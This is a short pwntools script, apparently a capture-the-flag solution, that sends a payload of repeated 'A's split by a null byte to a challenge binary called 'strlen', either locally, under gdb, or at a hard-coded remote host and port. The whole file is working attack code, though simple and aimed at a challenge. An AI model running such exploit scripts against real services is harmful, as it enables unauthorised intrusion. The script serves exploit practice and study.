#!/usr/bin/python
from pwn import *
import sys

host = '128.199.161.191'
port = 23338

def exploit (r):
	payload = 'A' * 30
	print r.recvuntil ("> ")
	r.sendline (payload + '\0' + payload)
	print r.recvline ()
	print r.recvline ()

e = ELF ('./strlen')

if len (sys.argv) == 2:
	if (sys.argv [1] == 'debug'):
		r = process ('./strlen')
		gdb.attach (r)
		exploit (r)
	else:
		r = remote (host, port)
		exploit (r)
else:
	r = process ('./strlen')
	exploit (r)
